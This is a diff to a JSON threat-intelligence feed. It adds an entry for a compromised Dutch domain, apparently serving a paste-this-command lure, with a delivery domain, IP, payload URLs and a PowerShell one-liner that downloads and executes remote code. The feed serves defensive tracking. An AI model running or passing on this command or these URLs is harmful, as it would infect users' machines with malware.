@@ -509,5 +509,31 @@
     ],
     "ReportId": "cmwh0vpmy0mp50omlfe1m6kow",
     "ScannedAt": "2026-11-14T23:14:09.181000+00:00"
+  },
+  {
+    "UrlDomain": "www.nnadministratie.nl",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "193.141.3.72"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/4d72762f0a2f414d",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/4d72762f0a2f414d'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/4d72762f0a2f414d"
+    ],
+    "ReportId": "cmwh1uj7x0n750omlble342fr",
+    "ScannedAt": "2026-11-14T23:41:13.862000+00:00"
   }
 ]
